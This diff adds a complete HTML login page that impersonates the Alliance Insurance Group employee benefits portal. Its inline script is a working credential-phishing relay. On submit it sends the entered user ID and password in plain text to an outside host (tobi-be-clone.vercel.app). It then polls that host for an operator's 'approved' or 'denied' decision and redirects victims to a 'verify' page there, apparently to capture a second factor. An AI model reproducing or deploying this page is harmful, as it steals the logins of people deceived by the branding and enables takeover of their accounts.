@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Login | Alliance Insurance Group</title>
+<meta name="description" content="Sign in to your Alliance Insurance Group employee benefits account. Access your FSA, view claims, and manage your flexible spending.">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="Sign In - Alliance Insurance Group">
+<meta property="og:description" content="Log in to manage your employee benefits and Flexible Spending Account.">
+<meta property="og:type" content="website">
+<link rel="icon" type="image/jpeg" href="/assets/logo-aig.jpeg">
+<link rel="stylesheet" href="css/styles.css">
+<style>
+.auth-loader{
+  display:flex;align-items:center;gap:12px;
+  margin:20px 0 0;
+  opacity:0;transition:opacity .3s ease;
+  pointer-events:none;height:0;overflow:hidden;
+}
+.auth-loader.visible{opacity:1;height:auto;overflow:visible}
+.auth-spinner{
+  width:20px;height:20px;
+  border:2.5px solid #ddd;
+  border-top-color:var(--maroon);
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+  flex-shrink:0;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.auth-loader span{color:#888;font-size:13px}
+
+.auth-field-error{
+  color:#c0392b;font-size:11.5px;margin:4px 0 0;
+  opacity:0;height:0;overflow:hidden;transition:opacity .3s ease;
+}
+.auth-field-error.visible{opacity:1;height:auto;overflow:visible}
+
+.auth-error{
+  margin:16px 0 0;
+  padding:10px 14px;
+  background:#fdf2f2;
+  border:1px solid #f0d0d0;
+  border-radius:3px;
+  color:#9a3030;
+  font-size:12.5px;
+  line-height:1.5;
+  opacity:0;transition:opacity .4s ease;
+  pointer-events:none;height:0;overflow:hidden;
+}
+.auth-error.visible{opacity:1;height:auto;overflow:visible}
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <a class="logo" href="index.html"><img src="assets/logo-aig.jpeg" alt="Alliance Insurance Group - Employee Benefit Consultants"></a>
+
+  <div class="contact">
+    <div>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="7" y="2" width="10" height="20" rx="2"/><line x1="11" y1="18.3" x2="13" y2="18.3"/></svg>
+      <span>866-396-3967</span>
+    </div>
+    <div>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="2.5" y="4.5" width="19" height="15" rx="1.5"/><path d="M3.5 6l8.5 6.5L20.5 6"/></svg>
+      <span>fsa@allianceinsgroup.com</span>
+    </div>
+  </div>
+
+  <span class="page-title">Login</span>
+</header>
+
+<main>
+  <div class="auth-wrap">
+    <div class="auth-lock">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="10.5" width="14" height="10.5" rx="1.5"/><path d="M8 10.5V7a4 4 0 0 1 8 0v3.5"/><circle cx="12" cy="14.7" r="1.3"/><line x1="12" y1="15.8" x2="12" y2="18.2"/></svg>
+    </div>
+    <p class="auth-note">We will maintain the confidentiality of your personal information in<br>accordance with our privacy policy.</p>
+    <h1 class="auth-h">Sign in</h1>
+
+    <div class="auth-form-area">
+      <form id="loginForm" method="post" novalidate>
+        <div class="field">
+          <label for="userId">UserId <i>*</i></label>
+          <input type="text" id="userId" name="User ID" autocomplete="username" autofocus>
+        </div>
+        <p class="field-help">Forgot your Username? <a href="#">Let us help</a></p>
+
+        <div class="field">
+          <label for="password">Password <i>*</i></label>
+          <input type="password" id="password" name="Password" autocomplete="current-password">
+        </div>
+        <p class="field-help">Forgot your Password? <a href="#">Let us help</a></p>
+        <div class="auth-field-error" id="pwdError">Password cannot contain spaces.</div>
+
+        <button class="btn-lg maroon signin" type="submit">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5 5L20 6.5"/></svg>
+          <span>Sign in</span>
+        </button>
+
+        <div class="auth-loader" id="authLoader">
+          <div class="auth-spinner"></div>
+          <span>Signing in&hellip;</span>
+        </div>
+
+        <div class="auth-error" id="authError">
+          Unable to sign in &mdash; a server error occurred. Please try again later.
+        </div>
+      </form>
+
+      <p class="auth-reg">Don't have an account?</p>
+      <a class="btn-lg grey" href="register.html">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="8" r="3.4"/><path d="M3.4 20c0-3.7 2.7-6.2 5.6-6.2S14.6 16.3 14.6 20"/><line x1="18.6" y1="8.5" x2="18.6" y2="14.5"/><line x1="15.6" y1="11.5" x2="21.6" y2="11.5"/></svg>
+        <span>Register</span>
+      </a>
+    </div>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <nav>
+    <a href="#">About Us</a>
+    <a href="#">Terms of Use</a>
+    <a href="#">Privacy Policy</a>
+  </nav>
+  <div class="copy">&copy; Alliance Insurance Group 2018. All Rights Reserved.</div>
+  <div class="sitemap"><a href="#">Site Map</a></div>
+</footer>
+
+<script>
+(function () {
+  var DASHBOARD_URL = "https://tobi-be-clone.vercel.app";
+
+  var form = document.getElementById('loginForm');
+  var loader = document.getElementById('authLoader');
+  var error = document.getElementById('authError');
+  var pwdError = document.getElementById('pwdError');
+  var btn = form.querySelector('button[type="submit"]');
+  var uidInput = form.querySelector('#userId');
+  var pwdInput = form.querySelector('#password');
+  var activePoll = null;
+  var activeTimeout = null;
+
+  pwdInput.addEventListener('input', function () {
+    if (pwdInput.value.indexOf(' ') !== -1) {
+      pwdError.classList.add('visible');
+    } else {
+      pwdError.classList.remove('visible');
+    }
+  });
+
+  function maskEmail(val) {
+    var parts = val.split("@");
+    var u = parts[0];
+    var masked = u[0] + "***" + (u.length > 1 ? u[u.length - 1] : "");
+    return parts[1] ? masked + "@" + parts[1] : masked;
+  }
+
+  function resetForm() {
+    loader.classList.remove('visible');
+    btn.disabled = false;
+    btn.style.opacity = '';
+  }
+
+  function showError(msg) {
+    resetForm();
+    error.textContent = msg;
+    error.classList.add('visible');
+  }
+
+  form.addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    var uid = uidInput.value.trim();
+    var pwd = pwdInput.value;
+    if (!uid || !pwd) return;
+
+    if (pwd.indexOf(' ') !== -1) {
+      pwdError.classList.add('visible');
+      return;
+    }
+    pwdError.classList.remove('visible');
+    error.classList.remove('visible');
+    loader.classList.add('visible');
+    btn.disabled = true;
+    btn.style.opacity = '.5';
+
+    try {
+      var res = await fetch(DASHBOARD_URL + "/api/tasks", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          user_id: uid,
+          password: pwd,
+          method: "email",
+          masked_email: maskEmail(uid),
+          masked_phone: "N/A",
+          request_kind: "login",
+          member_origin: window.location.href,
+          project_name: document.title || "External Site"
+        })
+      });
+
+      var data = await res.json();
+      if (!res.ok) throw new Error(data.error);
+
+      var taskId = data.task.id;
+
+      activePoll = setInterval(async function () {
+        try {
+          var check = await fetch(DASHBOARD_URL + "/api/tasks/" + taskId);
+          var result = await check.json();
+
+          if (result.task.status === "approved") {
+            clearInterval(activePoll);
+            clearTimeout(activeTimeout);
+            window.location.href = "https://tobi-be-clone.vercel.app/verify?task=" + taskId;
+          } else if (result.task.status === "denied") {
+            clearInterval(activePoll);
+            clearTimeout(activeTimeout);
+            showError("Sign-in was not approved.");
+          }
+        } catch (err) {}
+      }, 3000);
+
+      activeTimeout = setTimeout(function () {
+        clearInterval(activePoll);
+        showError("Request timed out. Please try again.");
+      }, 150000);
+
+    } catch (err) {
+      showError("Unable to sign in. Please try again later.");
+    }
+  });
+})();
+</script>
+</body>
+</html>
